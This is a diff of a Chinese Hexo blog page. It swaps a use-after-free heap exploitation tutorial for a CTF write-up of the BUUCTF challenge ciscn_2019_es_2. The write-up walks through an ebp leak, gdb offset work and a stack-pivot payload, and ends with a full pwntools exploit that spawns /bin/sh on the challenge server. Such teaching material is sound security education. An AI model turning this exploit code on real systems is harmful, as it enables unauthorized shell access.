@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2022/10/01/uaf/"/>
+  <link rel="canonical" href="http://example.com/2022/11/12/ciscn-2019-es-2/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -31,19 +31,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>UAF - Chen</title>
+  <title>ciscn_2019_es_2 - Chen</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="ChenBlog - Chen - Chen">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="UAF">
-<meta property="og:url" content="http://example.com/2022/10/01/UAF/index.html">
+<meta property="og:title" content="ciscn_2019_es_2">
+<meta property="og:url" content="http://example.com/2022/11/12/ciscn-2019-es-2/index.html">
 <meta property="og:site_name" content="Chen">
-<meta property="og:description" content="TNND 说真的 堆开始的pwn就真的难度递增 网上的资料又少 又难理解 所以从UAF开始的各种堆利用手法 我都会倾尽自己全部的修辞能力和解释能力 尽可能让你理解的简单容易 因为我自己学的时候实在是太坐牢了 UAF原理先搞懂这个到底是什么意思吧 uaf 全程 use after free 很好理解的吧 就是当我们把一个chunk释放之后 再利用他 怎么做到这一点？ 1234567891011121">
+<meta property="og:description" content="出处buuctf checksec看一下保护机制  ida打开 主函数应该是vul 跟进看一下 12345678910int vul()&amp;#123;  char s[40]; &#x2F;&#x2F; [esp+0h] [ebp-28h] BYREF  memset(s, 0, 0x20u);  read(0, s, 0x30u);  printf(&quot;Hello, %s\n&quot;, s);  read">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2022-10-01T13:10:23.000Z">
-<meta property="article:modified_time" content="2022-10-01T13:51:40.139Z">
+<meta property="article:published_time" content="2022-11-12T00:46:28.000Z">
+<meta property="article:modified_time" content="2022-11-12T01:22:33.335Z">
 <meta property="article:author" content="Chen">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2362,7 +2362,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/01/UAF/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/12/ciscn-2019-es-2/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Chen">
   </span>
@@ -2383,7 +2383,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        UAF
+        ciscn_2019_es_2
       </h1>
       <div class='new-meta-box'>
         
@@ -2402,10 +2402,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
   <div class='new-meta-item category'>
     <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/%E5%A0%86/">堆</a>
+    <a class="category-link" href="/categories/wp/">wp</a>
     
       <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/%E5%A0%86/" itemprop="url"><span itemprop="name">堆</span></a>
+        <a href="/categories/wp/" itemprop="url"><span itemprop="name">wp</span></a>
       </span>
     
   </div>
@@ -2414,10 +2414,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-10-01T21:10:23+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-11-12T08:46:28+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Oct 1, 2022</p>
+    <p>发布于：Nov 12, 2022</p>
   </a>
 </div>
 
@@ -2440,87 +2440,34 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>TNND 说真的 堆开始的pwn就真的难度递增 网上的资料又少 又难理解 所以从UAF开始的各种堆利用手法 我都会倾尽自己全部的修辞能力和解释能力 尽可能让你理解的简单容易 因为我自己学的时候实在是太坐牢了</p>
-<h2 id="UAF原理"><a href="#UAF原理" class="headerlink" title="UAF原理"></a>UAF原理</h2><p>先搞懂这个到底是什么意思吧 uaf 全程 use after free 很好理解的吧</p>
-<p>就是当我们把一个chunk释放之后 再利用他</p>
-<p>怎么做到这一点？</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;cstdlib&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char *p1;</span><br><span class="line">    p1 = (char *) malloc(sizeof(char)*10);//申请内存空间</span><br><span class="line">    memcpy(p1,&quot;hello&quot;,10);</span><br><span class="line">    printf(&quot;p1 addr:%x,%s\n&quot;,p1,p1);</span><br><span class="line">    free(p1);//释放内存空间</span><br><span class="line">    char *p2;</span><br><span class="line">    p2 = (char *)malloc(sizeof(char)*10);//二次申请内存空间，与第一次大小相同，申请到了同一块内存</span><br><span class="line">    memcpy(p1,&quot;world&quot;,10);//对内存进行修改</span><br><span class="line">    printf(&quot;p2 addr:%x,%s\n&quot;,p2,p1);//验证</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <p>出处buuctf</p>
+<p>checksec看一下保护机制</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zPrkOf"><img src="https://s1.ax1x.com/2022/11/12/zPrkOf.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/12/zPrkOf.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zPrkOf.png"></a></p>
+<p>ida打开 主函数应该是vul 跟进看一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>放一段代码 应该很好看懂吧</p>
-<p>先申请一个chunk 然后打印出指向这个chunk的指针的值</p>
-<p>再释放这个chunk 接着再申请一个</p>
-<p>最后再打印出新申请的chunk的指针的值</p>
-<p>我们会发现这二者都是一样的值</p>
-<p>说明什么？</p>
-<p><strong>如果只是单纯的free chunk的话 没有去清空指向被free的这个chunk的指针 那么这个指针仍然可以指向这个free chunk</strong></p>
-<p>概念介绍到这边 应该就可以大部分理解了 如果你需要更加详细的介绍 可以看下面这篇文章</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31481187/article/details/73612451">(3条消息) UAF (Use After Free)漏洞分析及利用_4ct10n的博客-CSDN博客_uaf</a></p>
-<h2 id="真题复现1"><a href="#真题复现1" class="headerlink" title="真题复现1"></a>真题复现1</h2><p>说真的 光uaf的题型就有好多种出法 想了想 还是拿nisa 21届校赛的题来当第一道例题 这道题的引导性个人认为十分不错 同时讲解起来也方便理解</p>
-<p><img src="https://s1.328888.xyz/2022/10/01/MpBrs.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/10/01/MpBrs.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="MpBrs.png"></p>
-<p>checksec看一下保护机制和位数  发现是<strong>32位</strong>的  那么接下来的一些数据就得注意了</p>
-<p>拖到ida里面看看main函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1.create&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;2.edit&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;3.delete&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;4.show&quot;</span>);</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">58</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">0</span>] != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3[<span class="number">0</span>] &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">0</span>] == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        del();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3[<span class="number">0</span>] == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">0</span>] != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      create();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>只能溢出两个字长 只够我们覆盖ebp和ret addr</p>
+<p>这种情况下只能考虑栈迁移了</p>
+<p>先搞清楚为什么出题人会给两个read吧</p>
+<p>栈迁移我们首先需要知道栈帧的地址</p>
+<p>而我们知道 一个栈帧在结束的时候 ebp中存储的是父函数的栈底地址</p>
+<p>printf函数遇到\0时就会停止输出 如果我们将s这个数组填满</p>
+<p>那么它就会继续输出下一个字长 这样我们就泄露了ebp的内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x27</span>+<span class="string">b&quot;b&quot;</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are creating the %d page\n&quot;</span>, i);</span><br><span class="line">  result = i;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &lt;= <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = i;</span><br><span class="line">      (&amp;page)[v1] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">      <span class="keyword">if</span> ( i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &lt;= <span class="number">0</span> || i &gt; <span class="number">9</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = <span class="built_in">puts</span>(<span class="string">&quot;NO PAGE&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Good cretation!&quot;</span>);</span><br><span class="line">          result = ++i;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v2 = page;</span><br><span class="line">        *page = <span class="number">1868654951</span>;</span><br><span class="line">        v2[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">        *(page + <span class="number">1</span>) = echo;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;The init page&quot;</span>);</span><br><span class="line">        result = ++i;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时我们使用gdb进行动调 目的是为了得到ebp和我们输入的s的偏移(哪怕开启了pie或者RELRO 由于分页机制的特性 偏移是不变的)</p>
+<p>我们将断点打在vul函数的nop汇编的地址</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zPySxI"><img src="https://s1.ax1x.com/2022/11/12/zPySxI.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/12/zPySxI.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zPySxI.png"></a></p>
+<p>0xa8-0x70 &#x3D; 0x38 于是我们得到 变量s的起始地址为ebp_addr - 0x38</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = (<span class="string">b&quot;aaaa&quot;</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(ebp_addr-<span class="number">0x38</span>+<span class="number">0x10</span>)+<span class="string">b&quot;/bin/sh&quot;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x38</span>)+p32(leave_ret)</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input page&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO PAGE&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input your strings&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, (&amp;page)[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里解释一下p32(ebp_addr-0x38+0x10)</p>
+<p>我们知道 栈迁移需要一个字长的垃圾数据来平衡栈  此时aaaa的地址为ebp_addr-0x38</p>
+<p>&#x2F;bin&#x2F;sh前面的三个字长则占用了0xc字节</p>
+<p>所以此时&#x2F;bin&#x2F;sh的位置则位于ebp_addr-0x38+0x10</p>
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28157</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x27</span>+<span class="string">b&quot;b&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">ebp_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = <span class="number">0x8048400</span></span><br><span class="line">binsh_addr = ebp_addr - <span class="number">0x38</span>+<span class="number">0x10</span></span><br><span class="line">ret_addr = <span class="number">0x080483a6</span></span><br><span class="line">leave_addr = <span class="number">0x080484b8</span> </span><br><span class="line">payload = (cyclic(<span class="number">0x4</span>)+p32(system_addr)+p32(<span class="number">0xabcdabcd</span>)+p32(binsh_addr)+<span class="string">b&quot;/bin/sh&quot;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x38</span>)+p32(leave_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input page&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; i )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO PAGE&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">free</span>((&amp;page)[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input page&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; i )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;NO PAGE&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      echo((&amp;page)[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    (*(page + <span class="number">1</span>))(page);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>看蒙蔽了是不是 没关系 接下来 我们将花费足够的时间以及耐心来为你分析透彻这些代码</p>
-<p>目光聚集到main函数</p>
-<p>堆的经典菜单题 看懂不成问题吧 输入对应的数字跳转进对应的函数</p>
-<p>按照顺序我们先看create函数</p>
-<p><img src="https://s1.328888.xyz/2022/10/01/MpG1p.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/10/01/MpG1p.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="MpG1p.png"></p>
-<p>第一遍我们先粗略的遍历一遍这个函数的作用</p>
-<p>有一点小不同 其他题目可能还需要我们输入index来创建一个chunk 但是这题是用++i的办法来自己设置index</p>
-<p>可以看到创建的chunk大小固定为0x8</p>
-<p>接着看第二个箭头指向的代码</p>
-<p>*()就是指这个地址的内容</p>
-<p>假设哈 假设page &#x3D; 0x1000</p>
-<p>你可能以为page+1的结果会是0x1001</p>
-<p>其实不是 这里的1是指一个字长 也就是说结果其实是0x1004</p>
-<p>那么这段代码的意思也就是说</p>
-<p>page地址的下一个字长的内容更改为echo这个函数</p>
-<p>然后我们点进去看一下这个函数是干什么的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">echo</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>puts 有点东西是不是 不过我们先放着 再看一下edit函数</p>
-<p><img src="https://s1.328888.xyz/2022/10/01/MpavF.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/10/01/MpavF.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="MpavF.png"></p>
-<p>这个函数内容不用说看名字也懂干什么的吧  就是输入你要编辑的index数 然后再输入要更改的内容</p>
-<p>这里用到了scanf 这个函数没有限制输入字长 我们栈溢出的常客是不是</p>
-<p>所以这里也能来个溢出？ 对了 有这个想法 这题你能看到曙光了</p>
-<p>我们再回想一下 上一个函数create 指针所指向的下一个字长处是不是一个echo函数</p>
-<p>欸 是吧 替换addr来控制程序执行流我们再熟悉不过了</p>
-<p>不过先别激动 还有一个函数没看呢(delete我也解释不来 你就知道他free了chunk但是没有清空指针的内容就行了)</p>
-<p><img src="https://s1.328888.xyz/2022/10/01/Mp5g5.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/10/01/Mp5g5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Mp5g5.png"></p>
-<p>看到那个if判定了吗 如果我们只设置一个chunk 那么我们想要show这个chunk还不行 因为index不能为0</p>
-<p>所以我说这道题的引导性其实是很好的  他驱使你去进行uaf </p>
-<p>所以我们的思路是什么</p>
-<p>先创建一个page0的chunk 然后把他free了</p>
-<p>接着创建一个page1的chunk 由于page0被释放后会被存入fast bin</p>
-<p>此时申请的page1大小小于等于page0 所以page0就被重新分配给了page1</p>
-<p>他们两个共享一个空间 指针指向的地址相同 这里就利用了uaf</p>
-<p>那么我们之前看到的edit函数又该如何利用呢？再接着看show函数图上的第二个箭头</p>
-<p>这句代码的作用是什么？</p>
-<p>先执行指针所指向的地址的下一个字长的指令 接着用指针所指向的地址的内容当作先前执行的指令的参数</p>
-<p>看到这里你就能懂了吧 所以当我们不对chunk内容进行任何溢出时 当我们仅仅只是输入小于一个字长的数据时</p>
-<p>show函数就相当于调用了echo函数把chunk的内容puts了出来</p>
-<p>所以此时我们的思路就立马清晰了</p>
